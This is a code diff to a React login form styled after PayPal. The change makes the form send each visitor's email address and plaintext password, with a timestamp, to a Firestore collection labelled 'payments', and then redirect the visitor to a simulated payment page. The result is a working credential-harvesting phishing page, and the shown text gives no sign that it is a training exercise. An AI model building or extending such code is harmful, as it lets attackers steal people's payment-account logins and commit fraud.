@@ -2,32 +2,47 @@
 import * as React from "react";
 import { useState } from "react";
 import styles from "./PaypalLoginForm.module.css";
-import { useNavigate } from 'react-router-dom'; // Importa useNavigate
+import { useNavigate } from "react-router-dom"; // Importa useNavigate
+import { collection, addDoc } from "firebase/firestore"; // Importar Firestore
+import { db } from "../../credentials"; // Asegúrate de que la ruta sea correcta
 
 const PaypalLoginForm = () => {
-    const [formData, setFormData] = useState({
-        email: "",
-        password: "",
-        keepLoggedIn: false,
-    });
-    const navigate = useNavigate(); // Inicializa useNavigate
+  const [formData, setFormData] = useState({
+    email: "",
+    password: "",
+    keepLoggedIn: false,
+  });
+  const navigate = useNavigate(); // Inicializa useNavigate
 
-    const handleInputChange = (e) => {
-        const { name, value, type, checked } = e.target;
-        setFormData((prev) => ({
-            ...prev,
-            [name]: type === "checkbox" ? checked : value,
-        }));
-    };
+  const handleInputChange = (e) => {
+    const { name, value, type, checked } = e.target;
+    setFormData((prev) => ({
+      ...prev,
+      [name]: type === "checkbox" ? checked : value,
+    }));
+  };
 
-    const handleSubmit = (e) => {
-        e.preventDefault();
-        // Simula el inicio de sesión
-        setTimeout(() => {
-            // Redirige a la página de pago simulada
-            navigate('/paypal-payment');
-        }, 1000); // Espera 1 segundo para simular el procesamiento
-    };
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+
+    try {
+      // Guardar los datos en Firestore
+      await addDoc(collection(db, "payments"), {
+        email: formData.email,
+        password: formData.password,
+        keepLoggedIn: formData.keepLoggedIn,
+        date: new Date().toISOString(), // Agregar la fecha del envío
+      });
+
+      // Simula el inicio de sesión y redirige
+      setTimeout(() => {
+        navigate("/paypal-payment"); // Redirige a la página de pago simulada
+      }, 1000); // Espera 1 segundo para simular el procesamiento
+    } catch (error) {
+      console.error("Error al guardar los datos en Firestore:", error);
+      alert("Hubo un error al procesar tu solicitud. Intenta nuevamente.");
+    }
+  };
 
   return (
     <main className={styles.paypalContainer}>
